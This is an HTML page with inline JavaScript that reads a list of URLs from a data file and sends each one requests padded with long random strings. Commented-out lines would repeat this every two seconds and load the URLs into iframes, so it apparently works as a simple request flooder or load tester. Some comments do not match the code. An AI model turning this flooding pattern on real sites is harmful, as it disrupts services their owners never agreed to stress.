<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <!-- <div id="container" style="display: none;"></div> -->
  <div id="container"></div>
  <script>

    function generateRandomString(length) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';

      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
      }

      return result;
    }

    function generateRandomData() {
      const randomString = generateRandomString(100); // Generate a random string of length 1 million
      const randomId = Math.floor(Math.random() * 1000);
      const randomName = randomString;
      const randomAge = Math.floor(Math.random() * 80) + 18; // Random age between 18 and 97

      return {
        id: randomId,
        name: randomName,
        age: randomAge
      };
    }

    function fetchJsonData(url) {
      return fetch(url)
        .then(response => response.json())
        .then(data => {
          return data; // Return the parsed JSON data
        })
        .catch(error => {
          console.error('Error:', error);
        });
    }

    function post(url) {
      console.log(url); // The parsed JSON object

      const ss = generateRandomString(1024);
      const en = encodeURIComponent(ss);
      const ll = url + en;
      console.log(ll)

      const requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json' // Specify the content type
        },
        body: JSON.stringify(ss) // Convert data to JSON format
      };

      // fetch(url, requestOptions)
      fetch(url + ll)
        .then(response => response.json()) // Parse response as JSON
        .then(data => {
          console.log('Response data:', data);
        })
        .catch(error => {
          console.error('Error:', error);
        });
    }

    function name(url) {
      console.log(url); // The parsed JSON object

      // Usage
      // fetchJsonData(url)
      //   .then(result => {
      //     console.log(result); // The parsed JSON object
      //   });

      // Get a reference to the parent element
      var parentElement = document.getElementById("container");

      // Create a new <iframe> element
      var newIframe = document.createElement('iframe');
      // Set attributes for the new <iframe>
      newIframe.width = '400';
      newIframe.height = '300';
      newIframe.src = url;
      // Set the sandbox attribute to isolate the iframe
      newIframe.sandbox = 'allow-same-origin allow-scripts';
      // Append the new div to the parent element
      parentElement.appendChild(newIframe);
    }

    function clean() {
      // Get a reference to the parent element (e.g., the <body>)
      var parentElement = document.body; // You can replace this with another parent element if needed

      // Remove all <iframe> elements from the parent
      var iframes = parentElement.getElementsByTagName('iframe');
      for (var i = iframes.length - 1; i >= 0; i--) {
        iframes[i].parentNode.removeChild(iframes[i]);
      }
    }

    function build() {
      // Usage
      fetchJsonData('data.json')
        .then(result => {
          console.log(result); // The parsed JSON object
          result.url.map(post);
        });
    }

    build();
    // setTimeout(clean, 7000);
    // window.setInterval((() => build()), 2000);
  </script>
</body>

</html>
